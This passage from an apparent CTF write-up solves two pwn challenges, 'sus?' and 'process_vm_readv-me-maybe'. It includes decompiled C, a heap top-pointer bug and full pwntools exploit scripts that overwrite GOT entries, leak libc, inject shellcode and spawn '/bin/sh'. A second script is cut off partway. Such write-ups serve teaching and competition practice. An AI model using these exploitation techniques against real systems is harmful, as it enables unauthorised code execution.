</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v6 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open_hook</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a2 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not sus: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">reset</span>(v6);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please decide what to do with this file: sus/not&#34;</span>);
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read_line</span>(v6);
</span></span><span style="display:flex;"><span>    buffer <span style="color:#f92672">=</span> v6<span style="color:#f92672">-&gt;</span>buffer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>buffer <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buffer[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;u&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buffer[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;SUS ALERT!!!: %s!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlink</span>(a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not sus: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Go to the main function, it starts by opening the file <code>/proc/self/fd/0</code>, and then the <code>buffer</code> we enter will be passed to the <code>sus_open</code> function if it has the <code>sus</code> prefix. If not, it will reset the <code>cap_size</code> to the 0x10 size, and perform a re-reading from the beginning</p>
<h2 id="bug">Bug</h2>
<p>In the <code>read_file</code> function, it&rsquo;s called <code>regalloc</code> if the size is larger than the cap size, if our input has a null byte or newline, it stops reading and resets to read again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">read_file</span>(susfile <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> a1<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">reset</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">&gt;=</span> a1<span style="color:#f92672">-&gt;</span>buf_cap )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">resize</span>(a1, a1<span style="color:#f92672">-&gt;</span>buf_cap <span style="color:#f92672">+</span> <span style="color:#ae81ff">256</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">&gt;=</span> a1<span style="color:#f92672">-&gt;</span>buf_cap )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;fileinfo-&gt;buf_size &lt; fileinfo-&gt;buf_cap&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x10Bu</span>, <span style="color:#e6db74">&#34;susfile_read_in&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">susfile_get_buffer_end</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">syscall</span>(<span style="color:#ae81ff">0LL</span>, fd, v3, <span style="color:#ae81ff">1LL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;res == 1&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x10Fu</span>, <span style="color:#e6db74">&#34;susfile_read_in&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>v3 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!*</span>v3 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>a1<span style="color:#f92672">-&gt;</span>buf_size;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So, if the buffer equal to top_ptr, it updates the top_ptr without checking the &lsquo;pointer&rsquo; has exceeded the bound.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">&amp;</span>a1[a2] <span style="color:#f92672">==</span> top )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    top <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>a1[a3];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a1;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h2 id="solution">Solution</h2>
<p>I trigger the bug to overwrite the top_ptr to <code>strlen_got</code></p>
<p><img src="https://imgur.com/WexYRIR.png" alt="image"></p>
<p>My idea is to overwrite the memset function with the <code>puts</code> function, and the <code>top_ptr</code> now points to the <code>alarm_got</code>.</p>
<p><img src="https://imgur.com/OFrcqS9.png" alt="image"></p>
<p>So, the next <code>galloc</code> will print our gift =))</p>
<p><img src="https://imgur.com/1f6zxoU.png" alt="image"></p>
<p>The custom heap struct is beneath the GOT region, so I easily overwrite the <code>readline</code> function pointer with my one_gadget. Fortunately, there is 1 that satisfies the condition.</p>
<p><img src="https://imgur.com/TbG73to.png" alt="image"></p>
<h2 id="solve-script">Solve script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./sus?&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#34;suscall.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">505</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./sus?&#34;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>ticket <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ticket{NiceDialup3334n24:Dc18ctaSmj_o6ck0WAO2-q7wSmUJ4w8-y719xXeqNBNGyC6t}&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>    cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    handle SIGALRM noignore
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    b*0x00000000004012E1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ticket please: &#39;</span>, ticket)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>heap_top <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004064A0</span>
</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4040a0</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">928</span><span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x404038</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>p32(elf<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Looking for sus files...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#f92672">-</span>  <span style="color:#ae81ff">0xea540</span>
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xebc81</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><ul>
<li>flag{NiceDialup3334n24:6NhGAXbkoPeDnJtjEPTWpBbsZgIxEsrUL42Fu_0lKpltFBre0gRowaNOS0TTZh9GD1_kGlTw4X5JqdM4mF1g}</li>
</ul>
<h1 id="pwn---process_vm_readv-me-maybe">Pwn - process_vm_readv-me-maybe</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-2">Source-code overview</h2>
<p>In the main function, it&rsquo;s called <code>fork()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __pid_t v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">prctl</span>(<span style="color:#ae81ff">1499557217</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parent</span>(v4);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">child</span>(<span style="color:#ae81ff">1499557217LL</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>, v6);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>While the parent provides arbitrary reads and writes of the child&rsquo;s memory, the child installs seccomp, calls <code>mprotect</code> to make its code section has all permissions <code>rwx</code>, then enters the loop.</p>
<h2 id="solution-1">Solution</h2>
<p>My idea is to use arbitrary reads and writes in parent processes to write our shellcode to the code section of the child process.</p>
<p>My shellcode makes 3 chains:</p>
<ul>
<li>Overwrite <code>stdin pointer</code> in the <code>bss()</code> section of parent to string <code>/bin/sh</code>.</li>
<li>Overwrite <code>setbuf_got</code> with <code>system</code></li>
<li>Overwrite <code>kill_got</code> with <code>init+4</code></li>
</ul>
<p>Get shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM / x86-64 / set emulate on <span style="color:#f92672">]</span>──────────────────────────────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>   0x5d6760e8234d &lt;init+4&gt;     push   rax
</span></span><span style="display:flex;"><span>   0x5d6760e8234e &lt;init+5&gt;     mov    rdi, qword ptr <span style="color:#f92672">[</span>rip + 0x223b<span style="color:#f92672">]</span>     RDI, <span style="color:#f92672">[</span>stdin@GLIBC_2.2.5<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 0x73e0753d8678 ◂— 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span><span style="display:flex;"><span>   0x5d6760e82355 &lt;init+12&gt;    xor    ecx, ecx                          ECX <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>   0x5d6760e82357 &lt;init+14&gt;    mov    edx, <span style="color:#ae81ff">2</span>                            EDX <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>   0x5d6760e8235c &lt;init+19&gt;    xor    esi, esi                          ESI <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> ► 0x5d6760e8235e &lt;init+21&gt;    call   setvbuf@plt                 &lt;setvbuf@plt&gt;
</span></span><span style="display:flex;"><span>        stream: 0x73e0753d8678 ◂— 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span><span style="display:flex;"><span>        buf: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        modes: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        n: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h2 id="solve-script-1">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>)
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./chall&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:    
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
</span></span><span style="display:flex;"><span>stack <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(stack))
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readv</span>(addr):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writev</span>(addr, value):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(value)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>readv(ret)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29d90</span>
</span></span><span style="display:flex;"><span>print(hex(libc))
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>
</span></span><span style="display:flex;"><span>readv(l)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>pie <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1484</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>readv_helper <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span>
</span></span><span style="display:flex;"><span>writev_helper <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14fc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write_ <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>kk <span style="color:#f92672">=</span> write_
</span></span><span style="display:flex;"><span>print(hex(write_))
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3590</span>, libc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d8678</span>, writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
